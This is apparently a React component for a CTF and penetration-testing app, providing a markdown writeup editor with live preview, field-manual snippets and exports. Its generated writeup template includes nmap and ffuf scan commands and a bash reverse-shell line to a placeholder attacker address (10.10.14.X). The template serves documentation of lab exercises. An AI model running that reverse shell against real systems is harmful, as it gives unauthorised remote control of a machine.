import React, { useState, useEffect, useMemo, useRef, useDeferredValue } from 'react';
import { useParams } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { TACTICAL_SPRING } from '../../utils/motionTokens';
import { confirmAction } from '../../store/useConfirmStore';
import { 
  FileText, 
  Download, 
  Copy, 
  Check, 
  RotateCcw, 
  Code,
  Eye,
  BookOpen,
  FolderGit2,
  Printer,
  X,
  Search,
  Plus,
  Globe
} from 'lucide-react';
import { useCtfStore, BRAND_THEMES } from '../../store/useCtfStore';
import { useShallow } from 'zustand/react/shallow';
import { Machine } from '../../types';
import { playCyberSound, interpolateCommand } from '../../utils/helpers';
import { downloadWriteupHtml } from '../../utils/writeupHtmlExporter';
import { sanitizeFilename } from '../../utils/workspaceStorage';
import { PentestReportModal } from './PentestReportModal';
import { CPTS_NOTES, CptsNoteEntry, searchCptsNotes, getRecommendedNotesForMachine } from '../../utils/obsidianManualUtils';
import { PlatformIcon } from '../common/PlatformBadge';
import { CyberSelect } from '../common/CyberSelect';
import { PageHeader } from '../common/PageHeader';
import type { OverflowItem } from '../common/PageHeader';
import { CyberButton } from '../common/CyberButton';
export const renderInlineMarkdown = (text: string, keyPrefix: string | number): React.ReactNode => {
  if (!text) return text;

  // Fast path if text has no markdown formatting characters
  if (!text.includes('[[') && !text.includes('`') && !text.includes('*') && !text.includes('_') && !text.includes('[')) {
    return text;
  }

  // Tokenize: wikilinks, inline code, bold (** or __), links [text](url), italic (* or _)
  const tokenRegex = /(\[\[[^\]]+\]\]|`[^`\n]+`|\*\*[^*\n]+\*\*|__[^_\n]+__|\[[^\]\n]+\]\(https?:\/\/[^\s)]+\)|\*[^*\n]+\*|(?<!\w)_[^_\n]+_(?!\w))/g;
  const parts = text.split(tokenRegex);

  return parts.map((part, i) => {
    if (!part) return null;
    const subKey = `${keyPrefix}-inl-${i}`;

    // Wikilink
    if (part.startsWith('[[') && part.endsWith(']]')) {
      const raw = part.slice(2, -2);
      const [target, alias] = raw.split('|');
      return (
        <span
          key={subKey}
          className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded bg-surface-sunken border border-subtle text-secondary text-[11px] font-medium mx-0.5"
          title={`Wikilink: ${target.trim()}`}
        >
          <BookOpen className="w-2.5 h-2.5 inline" />
          {alias ? alias.trim() : target.trim()}
        </span>
      );
    }

    // Inline code
    if (part.startsWith('`') && part.endsWith('`') && part.length >= 2) {
      return (
        <code
          key={subKey}
          className="px-1.5 py-0.5 rounded bg-surface-card border border-subtle font-mono text-[11px] text-primary mx-0.5"
        >
          {part.slice(1, -1)}
        </code>
      );
    }

    // Bold (** or __)
    if (
      (part.startsWith('**') && part.endsWith('**') && part.length >= 4) ||
      (part.startsWith('__') && part.endsWith('__') && part.length >= 4)
    ) {
      return (
        <strong key={subKey} className="font-semibold text-primary">
          {part.slice(2, -2)}
        </strong>
      );
    }

    // Link [text](url)
    const linkMatch = part.match(/^\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)$/);
    if (linkMatch) {
      return (
        <a
          key={subKey}
          href={linkMatch[2]}
          target="_blank"
          rel="noopener noreferrer"
          className="text-accent hover:underline inline-flex items-center gap-0.5 font-medium"
        >
          {linkMatch[1]}
        </a>
      );
    }

    // Italic (* or _)
    if (
      (part.startsWith('*') && part.endsWith('*') && part.length >= 2) ||
      (part.startsWith('_') && part.endsWith('_') && part.length >= 2)
    ) {
      return (
        <em key={subKey} className="italic text-secondary">
          {part.slice(1, -1)}
        </em>
      );
    }

    return part;
  });
};

const renderLineWithWikilinks = (text: string, keyPrefix: string | number) => {
  return renderInlineMarkdown(text, keyPrefix);
};

const renderMarkdownPreview = (text: string) => {
  const lines = text.split('\n');
  let inFrontmatter = false;
  let frontmatterLines: string[] = [];
  let inCodeBlock = false;
  let codeBlockLang = '';
  let codeBlockLines: string[] = [];

  const elements: React.ReactNode[] = [];

  lines.forEach((line, idx) => {
    // Frontmatter detection
    if (idx === 0 && line.trim() === '---') {
      inFrontmatter = true;
      return;
    }
    if (inFrontmatter) {
      if (line.trim() === '---') {
        inFrontmatter = false;
        elements.push(
          <div key={`fm-${idx}`} className="mb-4 p-3 rounded-lg bg-surface-sunken border border-subtle text-[11px] font-mono text-secondary space-y-0.5">
            <div className="text-[11px] font-semibold text-muted mb-1 flex items-center gap-1">
              <FolderGit2 className="w-3 h-3" /> YAML frontmatter
            </div>
            {frontmatterLines.map((fl, fIdx) => (
              <div key={fIdx}>{fl}</div>
            ))}
          </div>
        );
        return;
      }
      frontmatterLines.push(line);
      return;
    }

    // Codeblock detection
    if (line.startsWith('```')) {
      if (!inCodeBlock) {
        inCodeBlock = true;
        codeBlockLang = line.replace('```', '').trim();
        codeBlockLines = [];
      } else {
        inCodeBlock = false;
        elements.push(
          <div key={`cb-${idx}`} className="my-3 rounded-lg overflow-hidden border border-inverse bg-surface-inverse">
            {codeBlockLang && (
              <div className="bg-surface-inverse-elevated px-3 py-1 text-[11px] text-on-inverse-muted font-mono border-b border-inverse flex items-center justify-between">
                <span>{codeBlockLang}</span>
                <Code className="w-3 h-3" />
              </div>
            )}
            <pre tabIndex={0} aria-label={codeBlockLang ? `${codeBlockLang} code block` : 'Code block'} className="p-3 text-xs text-on-inverse font-mono overflow-x-auto whitespace-pre-wrap">
              {codeBlockLines.join('\n')}
            </pre>
          </div>
        );
      }
      return;
    }

    if (inCodeBlock) {
      codeBlockLines.push(line);
      return;
    }

    // Headings
    if (line.startsWith('# ')) {
      elements.push(
        <h1 key={idx} className="text-xl font-semibold text-primary mt-4 mb-2 pb-1 border-b border-subtle">
          {renderLineWithWikilinks(line.replace('# ', ''), idx)}
        </h1>
      );
    } else if (line.startsWith('## ')) {
      elements.push(
        <h2 key={idx} className="text-base font-semibold text-primary mt-4 mb-1.5 flex items-center gap-2">
          {renderLineWithWikilinks(line.replace('## ', ''), idx)}
        </h2>
      );
    } else if (line.startsWith('### ')) {
      elements.push(
        <h3 key={idx} className="text-sm font-semibold text-primary mt-3 mb-1">
          {renderLineWithWikilinks(line.replace('### ', ''), idx)}
        </h3>
      );
    } else if (line.startsWith('---')) {
      elements.push(<hr key={idx} className="my-3 border-subtle" />);
    } else if (line.startsWith('- ')) {
      elements.push(
        <li key={idx} className="ml-4 text-xs text-primary list-disc my-0.5">
          {renderLineWithWikilinks(line.replace('- ', ''), idx)}
        </li>
      );
    } else if (line.trim() === '') {
      elements.push(<div key={idx} className="h-2" />);
    } else {
      elements.push(
        <p key={idx} className="text-xs text-primary leading-relaxed font-sans">
          {renderLineWithWikilinks(line, idx)}
        </p>
      );
    }
  });

  // Group consecutive list items into a real <ul> so <li> always has a list parent.
  const grouped: React.ReactNode[] = [];
  let listBuf: React.ReactElement[] = [];
  const flushList = () => {
    if (listBuf.length > 0) {
      grouped.push(
        <ul key={`ul-${grouped.length}`} className="list-disc">
          {listBuf}
        </ul>
      );
      listBuf = [];
    }
  };
  elements.forEach((el) => {
    if (React.isValidElement(el) && el.type === 'li') {
      listBuf.push(el);
    } else {
      flushList();
      grouped.push(el);
    }
  });
  flushList();

  return grouped;
};

interface DeferredMarkdownPreviewPaneProps {
  content: string;
}

const DeferredMarkdownPreviewPane: React.FC<DeferredMarkdownPreviewPaneProps> = React.memo(({ content }) => {
  const deferredContent = useDeferredValue(content);
  const isStale = deferredContent !== content;

  const renderedPreview = useMemo(() => {
    return renderMarkdownPreview(deferredContent);
  }, [deferredContent]);

  return (
    <div
      className={`flex flex-col rounded-xl border border-subtle bg-surface-card machined-edge-subtle overflow-hidden transition-opacity duration-150 ${isStale ? 'opacity-85' : 'opacity-100'}`}
      style={{ contain: 'content' }}
    >
      <div className="flex items-center justify-between border-b border-subtle px-4 py-2.5 bg-surface-sunken text-xs">
        <span className="font-semibold text-primary flex items-center gap-2">
          <Eye className="w-4 h-4 text-muted" /> Preview
        </span>
        <div className="flex items-center gap-2">
          {isStale && (
            <span className="text-[11px] px-1.5 py-0.5 rounded bg-surface-card text-muted border border-subtle">
              Syncing
            </span>
          )}
        </div>
      </div>

      <div tabIndex={0} role="region" aria-label="Rendered markdown preview" className="flex-1 p-5 overflow-y-auto max-h-[calc(100vh-280px)] bg-surface-card">
        {renderedPreview}
      </div>
    </div>
  );
});

export const computeWriteupTelemetry = (text: string) => {
  const trimmed = text.trim();
  return {
    chars: text.length,
    words: trimmed ? trimmed.split(/\s+/).length : 0,
    lines: text.split('\n').length,
  };
};

export const WriteupStudio: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const { machines, writeupMachineId, setWriteupMachineId, updateMachine, soundEnabled, globalVars, appBrand, isDeepStorageLoaded } = useCtfStore(
    useShallow((s) => ({
      machines: s.machines,
      writeupMachineId: s.writeupMachineId,
      setWriteupMachineId: s.setWriteupMachineId,
      updateMachine: s.updateMachine,
      soundEnabled: s.soundEnabled,
      globalVars: s.globalVars,
      appBrand: s.appBrand,
      isDeepStorageLoaded: s.isDeepStorageLoaded,
    }))
  );

  useEffect(() => {
    if (id && machines.some((m) => m.id === id)) {
      setWriteupMachineId(id);
    }
  }, [id, machines, setWriteupMachineId]);

  const selectedMachine = machines.find((m) => m.id === writeupMachineId) || machines[0];

  const [copied, setCopied] = useState(false);
  const [reportModalOpen, setReportModalOpen] = useState(false);
  const [editorContent, setEditorContent] = useState('');
  const [cptsDrawerOpen, setCptsDrawerOpen] = useState(false);
  const [cptsSearch, setCptsSearch] = useState('');
  const [debouncedSearch, setDebouncedSearch] = useState('');

  // Debounce search query by 150ms to maintain 120 FPS
  useEffect(() => {
    const timer = setTimeout(() => {
      setDebouncedSearch(cptsSearch);
    }, 150);
    return () => clearTimeout(timer);
  }, [cptsSearch]);

  // Capped at top 20 matches as mandated by Fable Advisor
  const matchingNotes = useMemo(() => {
    if (!debouncedSearch.trim()) {
      return selectedMachine ? getRecommendedNotesForMachine(selectedMachine, 20) : CPTS_NOTES.slice(0, 20);
    }
    return searchCptsNotes(debouncedSearch, 'ALL').slice(0, 20);
  }, [debouncedSearch, selectedMachine]);

  const handleInsertNote = (note: CptsNoteEntry) => {
    if (!selectedMachine) return;
    const targetVars = { ...globalVars, targetIp: selectedMachine.ip || globalVars.targetIp };
    const cmdsFormatted = note.commands && note.commands.length > 0
      ? `\n\`\`\`bash\n# ${note.title}\n${note.commands.map(c => interpolateCommand(c, targetVars)).join('\n')}\n\`\`\`\n`
      : '';

    const snippet = `\n\n---\n\n### 📚 Field Manual: ${note.title}\n> **Category:** ${note.category} | **Difficulty:** ${note.difficulty}\n> ${note.summary || note.subCategory}\n${cmdsFormatted}`;

    const updated = editorContent + snippet;
    setEditorContent(updated);
    updateMachine(selectedMachine.id, { writeupMarkdown: updated });
    if (soundEnabled) playCyberSound('root');
  };

  // Generate standardized template with YAML frontmatter for Obsidian / GitBook
  const generateTemplate = (m: Machine): string => {
    const today = new Date().toISOString().slice(0, 10);
    const tagsList = m.tags.length > 0 ? m.tags.join(', ') : 'ctf, pentest, writeup';

    return `---
title: "${m.platform || 'CTF'} Writeup - ${m.name}"
target_ip: "${m.ip}"
platform: "${m.platform}"
os: "${m.os}"
difficulty: "${m.difficulty}"
status: "${m.status}"
user_flag: "${m.userFlag || 'FLAG{...}'}"
root_flag: "${m.rootFlag || 'FLAG{...}'}"
time_spent: "${Math.round(m.timeSpentSeconds / 60)} minutes"
tags: [${tagsList}]
date: "${today}"
author: "ZeroBox Operator"
---

# ${m.name} - Writeup & Penetration Testing Report
**Target IP:** \`${m.ip}\` | **OS:** ${m.os} | **Platform:** ${m.platform} | **Difficulty:** ${m.difficulty}

---

## 1. Executive Summary & Difficulty Breakdown
- **Initial Foothold Vector:** [Brief summary of initial vulnerability, e.g. SQL Injection / LFI / Deserialization]
- **Privilege Escalation Vector:** [Brief summary of root escalation, e.g. SUID binary / Sudo misconfiguration / ADCS]
- **Perceived Rating:** ${m.difficulty} (Official) vs ${m.perceivedDifficulty || m.difficulty} (Perceived)

---

## 2. Reconnaissance & Nmap Scan Results
### TCP All-Ports Scan
\`\`\`bash
# Fast SYN and Service Version Detection
nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt ${m.ip}
\`\`\`

### Discovered Services:
- **Port 22/tcp:** Open (OpenSSH 8.4p1)
- **Port 80/tcp:** Open (Apache httpd 2.4.41)
- **Port 445/tcp:** Filtered (SMB)

### Web Directory & Endpoint Fuzzing
\`\`\`bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://${m.ip}/FUZZ -ac
\`\`\`

---

## 3. Vulnerability Analysis & Foothold Exploitation
### Discovery:
[Detail the attack vector found during enumeration]

### Exploitation Proof-of-Concept:
\`\`\`bash
# Reverse Shell or Exploit Execution
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
\`\`\`

### User Flag Loot:
\`\`\`bash
cat /home/*/user.txt
# Flag: ${m.userFlag || 'FLAG{...}'}
\`\`\`

---

## 4. Privilege Escalation & Proof of Concept
### Internal Enumeration:
- Ran LinPEAS / WinPEAS automated audit.
- Identified misconfigured SUID / Sudo permissions:
\`\`\`bash
sudo -l
\`\`\`

### Root Escalation:
[Explain escalation path step by step]

### Root / System Flag:
\`\`\`bash
cat /root/root.txt
# Flag: ${m.rootFlag || 'FLAG{...}'}
\`\`\`

---

## 5. Post-Exploitation Loot & Lessons Learned
- **Key Takeaway 1:** Always inspect source comments for credential leaks.
- **Key Takeaway 2:** Validate wildcard expansions in scheduled crontabs.
- **Mitigation:** Patch vulnerable services, restrict sudoers configuration, and apply least privilege principles.
`;
  };

  // Debounce refs for fluid, 120 FPS typing in the editor
  const debounceTimerRef = useRef<any>(null);
  const pendingMachineIdRef = useRef<string | null>(null);
  const pendingContentRef = useRef<string>('');

  const flushDebouncedSave = () => {
    if (debounceTimerRef.current) {
      clearTimeout(debounceTimerRef.current);
      debounceTimerRef.current = null;
    }
    if (pendingMachineIdRef.current && pendingContentRef.current !== '') {
      updateMachine(pendingMachineIdRef.current, { writeupMarkdown: pendingContentRef.current });
      pendingMachineIdRef.current = null;
    }
  };

  // Flush debounced writeup updates on unmount
  useEffect(() => {
    return () => {
      flushDebouncedSave();
    };
  }, []);

  // Synchronize editor content with selected machine writeup safely
  useEffect(() => {
    if (!selectedMachine) return;

    if (selectedMachine.writeupMarkdown) {
      flushDebouncedSave();
      setEditorContent(selectedMachine.writeupMarkdown);
      return;
    }

    if (isDeepStorageLoaded && !selectedMachine.writeupMarkdown) {
      flushDebouncedSave();
      const tmpl = generateTemplate(selectedMachine);
      setEditorContent(tmpl);
      updateMachine(selectedMachine.id, { writeupMarkdown: tmpl });
    }
  }, [selectedMachine?.id, selectedMachine?.writeupMarkdown, isDeepStorageLoaded]);

  const telemetry = useMemo(() => computeWriteupTelemetry(editorContent), [editorContent]);

  const handleEditorChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const val = e.target.value;
    setEditorContent(val);
    if (selectedMachine) {
      pendingMachineIdRef.current = selectedMachine.id;
      pendingContentRef.current = val;
      if (debounceTimerRef.current) {
        clearTimeout(debounceTimerRef.current);
      }
      debounceTimerRef.current = setTimeout(() => {
        if (selectedMachine) {
          updateMachine(selectedMachine.id, { writeupMarkdown: val });
          pendingMachineIdRef.current = null;
        }
      }, 400);
    }
  };

  const handleResetToTemplate = async () => {
    if (!selectedMachine) return;
    const ok = await confirmAction({
      title: `Reset writeup for ${selectedMachine.name}?`,
      body: 'This replaces the current writeup with the standard template. Unsaved edits will be lost.',
      confirmLabel: 'Reset',
      tone: 'danger',
    });
    if (ok) {
      const tmpl = generateTemplate(selectedMachine);
      setEditorContent(tmpl);
      updateMachine(selectedMachine.id, { writeupMarkdown: tmpl });
      if (soundEnabled) playCyberSound('root');
    }
  };

  const handleCopyMarkdown = () => {
    navigator.clipboard.writeText(editorContent);
    setCopied(true);
    if (soundEnabled) playCyberSound('copy');
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownloadMarkdown = () => {
    if (!selectedMachine) return;
    const blob = new Blob([editorContent], { type: 'text/markdown;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    const rawSlug = (selectedMachine.name || 'writeup').toLowerCase().replace(/[^a-z0-9]/g, '-');
    const safeSlug = sanitizeFilename(rawSlug, 'writeup');
    link.download = `${safeSlug}-writeup.md`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    if (soundEnabled) playCyberSound('root');
  };

  const handleDownloadHtml = () => {
    if (!selectedMachine) return;
    const activeBrandObj = BRAND_THEMES.find((b) => b.id === appBrand) || BRAND_THEMES[0];
    downloadWriteupHtml(selectedMachine, editorContent, {
      brandName: `${activeBrandObj.namePrefix}${activeBrandObj.nameSuffix}`,
    });
    if (soundEnabled) playCyberSound('export');
  };


  const overflowItems: OverflowItem[] = [
    {
      id: 'field-manual',
      label: cptsDrawerOpen ? 'Hide field manual' : `Field manual (${matchingNotes.length})`,
      icon: <BookOpen className="w-3.5 h-3.5" />,
      onSelect: () => setCptsDrawerOpen((prev) => !prev),
    },
    {
      id: 'executive-report',
      label: 'Executive report',
      icon: <Printer className="w-3.5 h-3.5" />,
      onSelect: () => setReportModalOpen(true),
    },
    {
      id: 'copy-raw',
      label: 'Copy raw Markdown',
      icon: <Copy className="w-3.5 h-3.5" />,
      onSelect: handleCopyMarkdown,
    },
    {
      id: 'export-md',
      label: 'Export .md',
      icon: <Download className="w-3.5 h-3.5" />,
      onSelect: handleDownloadMarkdown,
    },
    {
      id: 'reset-template',
      label: 'Reset to template',
      icon: <RotateCcw className="w-3.5 h-3.5" />,
      onSelect: handleResetToTemplate,
      danger: true,
    },
  ];

  const toolbarBtn =
    'flex items-center gap-1.5 px-3 h-8 rounded-lg bg-surface-card border border-subtle hover:border-strong text-secondary hover:text-primary text-xs font-medium transition-[transform,background-color,border-color,color] cursor-pointer active:scale-[0.97]';

  return (
    <div className="space-y-4 w-full font-sans">
      <PageHeader
        title="Writeup studio"
        description="Write in Markdown with a live preview. Exports to Obsidian and GitBook."
        icon={<FileText />}
        primaryAction={
          <CyberButton
            variant="primary"
            size="md"
            className="max-sm:h-11 max-sm:flex-1"
            onClick={handleDownloadHtml}
            title="Export a self-contained HTML writeup with one-click Print to PDF"
            iconLeft={<Globe className="w-3.5 h-3.5" />}
          >
            Export HTML
          </CyberButton>
        }
        actions={
          <>
            <button
              type="button"
              onClick={handleCopyMarkdown}
              className={toolbarBtn}
            >
              {copied ? (
                <>
                  <Check className="w-3.5 h-3.5 text-callout-success-fg" />
                  <span className="text-callout-success-fg">Copied</span>
                </>
              ) : (
                <>
                  <Copy className="w-3.5 h-3.5" />
                  <span>Copy raw</span>
                </>
              )}
            </button>
            <button
              type="button"
              onClick={() => setCptsDrawerOpen((prev) => !prev)}
              aria-pressed={cptsDrawerOpen}
              className={`${toolbarBtn} ${cptsDrawerOpen ? 'border-accent text-primary' : ''}`}
              title="Toggle the field manual quick reference"
            >
              <BookOpen className="w-3.5 h-3.5" />
              <span>Field manual (<span className="tabular-nums">{matchingNotes.length}</span>)</span>
            </button>
            <button
              type="button"
              onClick={() => setReportModalOpen(true)}
              className={toolbarBtn}
              title="Generate a print-ready executive penetration testing report"
            >
              <Printer className="w-3.5 h-3.5" />
              <span>Executive report</span>
            </button>
            <button
              type="button"
              onClick={handleDownloadMarkdown}
              className={toolbarBtn}
              title="Export raw Markdown (.md) for Obsidian or GitBook"
            >
              <Download className="w-3.5 h-3.5" />
              <span>Export .md</span>
            </button>
          </>
        }
        overflow={overflowItems}
      >
        {/* Machine selector + official walkthrough shortcut: one row */}
        <div className="flex flex-wrap items-center gap-2.5">
          <div className="flex items-center gap-1.5 bg-surface-sunken px-2.5 py-1 max-sm:py-2 rounded-lg border border-subtle max-sm:w-full">
            <span className="text-xs font-medium text-muted flex-shrink-0">Target</span>
            <CyberSelect
              value={selectedMachine?.id || ''}
              onChange={setWriteupMachineId}
              options={machines.map((m) => ({
                value: m.id,
                label: `${m.name} (${m.platform})`,
                icon: <PlatformIcon platform={m.platform} className="w-3.5 h-3.5" />,
                description: `${m.ip} · ${m.difficulty}`,
              }))}
              searchable
              searchPlaceholder="Search box by name, IP..."
              variant="transparent"
              size="xs"
              triggerClassName="py-0 px-1 border-none bg-transparent hover:bg-transparent max-w-[210px] max-sm:max-w-none"
              soundEnabled={soundEnabled}
            />
          </div>

        </div>
      </PageHeader>

      {/* Field Manual Quick Reference Drawer */}
      <AnimatePresence initial={false}>
      {cptsDrawerOpen && (
        <motion.div
          key="cpts-drawer"
          initial={{ opacity: 0, y: -8 }}
          animate={{ opacity: 1, y: 0, transition: TACTICAL_SPRING }}
          exit={{ opacity: 0, y: -8, transition: { duration: 0.14, ease: 'easeOut' } }}
          className="p-4 rounded-xl border border-subtle bg-surface-elevated machined-edge-subtle space-y-3 font-sans">
          <div className="flex items-center justify-between border-b border-subtle pb-2.5">
            <div className="flex items-center gap-2">
              <BookOpen className="w-4 h-4 text-muted" />
              <span className="font-semibold text-primary text-xs">
                Field manual quick reference
              </span>
              <span className="text-xs px-2 py-0.5 rounded bg-surface-sunken text-muted border border-subtle font-mono tabular-nums">
                {matchingNotes.length} matches (max 20)
              </span>
            </div>

            <button aria-label="Close quick reference"
              type="button"
              onClick={() => setCptsDrawerOpen(false)}
              className="p-1 max-sm:p-3 rounded text-muted hover:text-primary cursor-pointer active:scale-[0.97]"
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          {/* Quick Search Bar */}
          <div className="relative">
            <Search className="w-3.5 h-3.5 text-muted absolute left-3 top-2.5" />
            <input
              type="text"
              id="writeup-notes-search"
              name="writeup-notes-search"
              aria-label="Search field manual notes and commands"
              value={cptsSearch}
              onChange={(e) => setCptsSearch(e.target.value)}
              placeholder="Search notes and commands (kerberoast, suid, lfi, bloodhound)..."
              className="w-full bg-surface-sunken border border-strong rounded-lg pl-8 pr-3 py-1.5 text-xs text-primary placeholder:text-muted focus:outline-none focus:border-accent"
            />
          </div>

          {/* Matching Notes Grid */}
          <div tabIndex={0} role="region" aria-label="Matching field manual notes" className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 max-h-72 overflow-y-auto pr-1">
            {matchingNotes.length === 0 ? (
              <div className="col-span-full p-4 text-center text-xs text-muted">
                No matching field manual notes found.
              </div>
            ) : (
              matchingNotes.map((note) => (
                <div
                  key={note.id}
                  className="p-3 rounded-lg bg-surface-sunken border border-subtle hover:border-strong transition-colors space-y-2 flex flex-col justify-between"
                >
                  <div className="space-y-1">
                    <div className="flex items-center justify-between gap-1">
                      <span className="font-semibold text-primary text-xs truncate" title={note.title}>
                        {note.title}
                      </span>
                      <span className="text-[11px] px-1.5 py-0.5 rounded bg-surface-card text-muted border border-subtle flex-shrink-0">
                        {note.difficulty}
                      </span>
                    </div>
                    <div className="text-[11px] text-muted line-clamp-2">
                      {note.summary || note.subCategory}
                    </div>
                  </div>

                  {note.commands && note.commands.length > 0 && (
                    <div className="p-1.5 rounded bg-surface-inverse border border-inverse font-mono text-[11px] text-on-inverse truncate">
                      {interpolateCommand(note.commands[0], { ...globalVars, targetIp: selectedMachine?.ip || globalVars.targetIp })}
                    </div>
                  )}

                  <div className="flex items-center justify-between gap-2 pt-1 border-t border-subtle">
                    <span className="text-[11px] text-muted truncate">
                      {note.category}
                    </span>
                    <button
                      type="button"
                      onClick={() => handleInsertNote(note)}
                      className="flex items-center gap-1 px-2.5 py-1 max-sm:py-2.5 rounded bg-surface-card hover:bg-surface-hover border border-subtle text-secondary hover:text-primary text-xs font-medium transition-colors cursor-pointer active:scale-[0.97]"
                      title="Insert this note and commands into active writeup"
                    >
                      <Plus className="w-3 h-3" />
                      <span>Insert</span>
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </motion.div>
      )}
      </AnimatePresence>

      {/* Dual-Pane Editor Workspace */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 items-stretch lg:min-h-[calc(100vh-250px)]">
        
        {/* Left Pane: Raw Markdown Editor */}
        <div className="flex flex-col rounded-xl border border-subtle bg-surface-card machined-edge-subtle overflow-hidden" style={{ contain: 'content' }}>
          <div className="flex items-center justify-between border-b border-subtle px-4 py-2.5 bg-surface-sunken text-xs">
            <span className="font-semibold text-primary flex items-center gap-2">
              <Code className="w-4 h-4 text-muted" /> Markdown
            </span>
            <span className="text-[11px] text-muted font-mono tabular-nums">
              {telemetry.chars} chars · {telemetry.lines} lines
            </span>
          </div>

          <textarea
            id="writeup-markdown-editor"
            name="writeup-markdown-editor"
            aria-label="Markdown report editor"
            value={editorContent}
            onChange={handleEditorChange}
            onBlur={flushDebouncedSave}
            placeholder="Write your penetration testing report or paste notes here..."
            className="flex-1 w-full min-h-[320px] p-4 bg-transparent text-primary font-mono text-xs focus:outline-none resize-none leading-relaxed overflow-y-auto"
            spellCheck={false}
          />
        </div>

        {/* Right Pane: Live Rendered Preview (Deferred AST tokenization) */}
        <DeferredMarkdownPreviewPane content={editorContent} />

      </div>

      {/* Footer Telemetry Strip */}
      <div
        data-testid="writeup-telemetry"
        className="flex items-center justify-end gap-4 px-4 py-2 rounded-lg border border-subtle bg-surface-sunken text-[11px] text-muted font-mono tabular-nums"
      >
        <span data-testid="writeup-telemetry-chars">{telemetry.chars} chars</span>
        <span data-testid="writeup-telemetry-words">{telemetry.words} words</span>
        <span data-testid="writeup-telemetry-lines">{telemetry.lines} lines</span>
      </div>

      {/* Executive Pentest Report Modal */}
      <PentestReportModal
        machine={selectedMachine || machines[0] || null}
        isOpen={reportModalOpen}
        onClose={() => setReportModalOpen(false)}
      />
    </div>
  );
};
